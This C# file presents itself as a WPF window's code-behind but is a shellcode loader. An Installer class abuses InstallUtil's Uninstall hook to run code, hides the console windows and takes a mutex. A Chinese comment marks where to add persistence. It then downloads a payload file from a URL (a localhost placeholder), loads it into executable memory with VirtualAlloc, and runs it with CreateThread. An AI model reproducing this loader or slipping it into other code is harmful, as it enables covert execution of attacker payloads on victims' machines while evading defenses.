using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows;

namespace ms
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }
		public class Program
		{

			public static void Main()
			{



			}

		}

		[System.ComponentModel.RunInstaller(true)]
		public class Sample : System.Configuration.Install.Installer
		{
			[DllImport("user32.dll", EntryPoint = "ShowWindow", SetLastError = true)]
			static extern bool ShowWindow(IntPtr hWnd, uint nCmdShow);
			[DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
			public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
			//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
			public override void Uninstall(System.Collections.IDictionary savedState)
			{
				//Mutex
				bool flag = false;
				System.Threading.Mutex mutex = new System.Threading.Mutex(true, "wkkxo34x", out flag);
				if (flag)
				{
					IntPtr a = FindWindow("ConsoleWindowClass", "taskeng.exe");
					IntPtr b = FindWindow("ConsoleWindowClass", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe");
					IntPtr c = FindWindow("ConsoleWindowClass", "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe");
					if (a != IntPtr.Zero)
						ShowWindow(a, 0);

					if (b != IntPtr.Zero)
						ShowWindow(b, 0);

					if (c != IntPtr.Zero)
						ShowWindow(c, 0);

					//在这里加自启动代码

					Shellcode.Exec();
					System.Threading.Thread.Sleep(86400000);
				}
				else
				{
					Environment.Exit(0);
				}


			}

		}

		public class Shellcode
		{
			public static void Exec()
			{

				string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				string indexpath = "C:\\intel\\index.dat";
				if (File.Exists(indexpath))
				{

				}
				else
				{
					string url = "http://127.0.0.1/index.dat";
                    System.Net.WebClient myWebClient = new WebClient();
					myWebClient.DownloadFile(url, indexpath);
				}
				byte[] shellcode = File.ReadAllBytes("C:\\intel\\index.dat");


				UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
									MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
				IntPtr hThread = IntPtr.Zero;
				UInt32 threadId = 0;
				// prepare data


				IntPtr pinfo = IntPtr.Zero;

				// execute native code

				hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
				WaitForSingleObject(hThread, 0xFFFFFFFF);

			}

			private static UInt32 MEM_COMMIT = 0x1000;

			private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

			[DllImport("kernel32")]
			private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
			 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

			[DllImport("kernel32")]
			private static extern IntPtr CreateThread(

			  UInt32 lpThreadAttributes,
			  UInt32 dwStackSize,
			  UInt32 lpStartAddress,
			  IntPtr param,
			  UInt32 dwCreationFlags,
			  ref UInt32 lpThreadId

			  );


			[DllImport("kernel32")]
			private static extern UInt32 WaitForSingleObject(

			  IntPtr hHandle,
			  UInt32 dwMilliseconds
			  );

		}
	}

}
